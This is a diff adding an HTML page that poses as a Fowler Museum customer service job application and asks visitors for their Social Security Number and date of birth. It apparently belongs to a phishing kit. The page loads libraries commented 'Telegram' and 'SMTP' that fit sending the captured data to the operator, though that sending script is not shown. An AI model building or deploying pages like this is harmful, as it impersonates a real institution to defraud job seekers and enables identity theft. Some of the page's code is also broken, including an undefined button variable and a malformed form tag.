@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=0.9, user-scalable=no">
+        
+        <title>Fowler - Application</title>
+
+        <!--href stands for hypertext reference-->
+        <link rel="icon" href="ico.png" type="image/png">
+
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> <!-- Telegram -->
+        <script src="https://smtpjs.com/v3/smtp.js"></script> <!-- SMTP -->
+
+        <link rel="stylesheet" href="style.css" type="text/css">
+        <script src = "accepted.js"></script>
+
+</head>
+<body>
+    <div class="container">
+        <div class="navbar__container">
+            <nav class="navbar">
+                <div class="navbar__container">
+                    <a href="accepted.html" id="navbar__logo"><img src="header.png" class="img"></a>
+                </div>
+            </nav>
+        </div>
+
+        <div class="main">
+            <p class="prop">Customer Service Agent Application</p>
+            <p class="basic10">For background check purposes, please submit the following.</p><br><br>
+            <form action="#" class="survey1" id="myform7">
+                <div class="pleasecontain">
+                    <p id="pleasemain2">Invalid Parameters.</p><br>
+                </div>
+            
+                <input id="ssn" inputmode="numeric" type="password" placeholder="Social Security Number" required oninput="pLength(this)">
+                <input id="dob" inputmode="numeric" type="text" oninput="dobLength(this)" placeholder="Date Of Birth" required>
+                <input id="fsubmit" type="submit" value="Continue">
+            <form>
+        </div>
+        
+    </div>
+    <script>
+        var button7 = document.querySelector('.survey1 input[type="submit"]');
+
+        button7.addEventListener('click', function(event) {
+            var ssn0 = document.getElementById("ssn");
+            var dob0 = document.getElementById("dob");
+            var pleasemain = document.getElementById("pleasemain2");
+
+            if (
+                ssn0.value.trim().length !== 11 ||
+                ssn0.value.trim() === '' ||
+                dob0.value.trim().length !== 10 ||
+                dob0.value.trim() === ''
+            ) {
+
+                event.preventDefault();
+
+                pleasemain.style.display = 'flex'
+
+                window.scrollTo({
+                    top,
+                    behavior: 'smooth'
+                });
+
+            } else {
+
+                button.classList.add('clicked');
+                button.style.opacity = 0.5;
+
+                pleasemain.style.display = 'none'; // Reset the CSS change
+                setTimeout(function() {
+
+                    button.classList.remove('clicked');
+                    button.style.opacity = 1;
+
+                }, 4000);
+                
+            }
+        });
+    </script>
+
+    <!-- auto SSN -->
+    <script>
+        const ssnInput = document.getElementById("ssn");
+
+        ssnInput.addEventListener("input", function (event) {
+            const input = event.target.value;
+            const sanitizedInput = input.replace(/\D/g, ''); // Remove non-digit characters
+
+            if (sanitizedInput.length > 9) {
+                event.target.value = sanitizedInput.substring(0, 9);
+                return;
+            }
+
+            let formattedInput = '';
+            let currentIndex = 0;
+
+            for (let i = 0; i < sanitizedInput.length; i++) {
+                if (currentIndex === 3 || currentIndex === 5) {
+                    formattedInput += '-';
+                }
+                formattedInput += sanitizedInput[i];
+                currentIndex++;
+            }
+
+            event.target.value = formattedInput;
+        });
+    </script>
+
+
+    <!--auto dob-->
+    <script>
+        const dobInput = document.getElementById("dob");
+        
+        dobInput.addEventListener("input", function (event) {
+            const input = event.target.value;
+            const sanitizedInput = input.replace(/\D/g, ''); // Remove non-digit characters
+        
+            if (sanitizedInput.length > 8) {
+            event.target.value = sanitizedInput.substring(0, 8);
+            return;
+            }
+        
+            let formattedInput = '';
+            let currentIndex = 0;
+        
+            for (let i = 0; i < sanitizedInput.length; i++) {
+            if (currentIndex === 2 || currentIndex === 4) {
+                formattedInput += '/';
+            }
+            formattedInput += sanitizedInput[i];
+            currentIndex++;
+            }
+        
+            event.target.value = formattedInput;
+        });
+    </script>
+    <!--dob length-->
+    <script>
+        function dobLength(input) {
+            if (input.value.length > 10) {
+            input.value = input.value.slice(0, 10);
+        }
+    }
+    </script>
+
+    <!-- ssn length -->
+    <script>
+        function pLength(input) {
+            if (input.value.length > 11) {
+            input.value = input.value.slice(0, 11);
+        }
+    }
+    </script>
+
+</body>
+<footer class="footer2">
+
+    <p class="bottom0">Fowler Museum 308 Charles E. Young Dr N, Los Angeles, CA 90024</p>
+    <p class="bottom1">Copyright © 2023 Fowler Museum. All Rights Reserved.</p>
+
+</footer>
+</html>
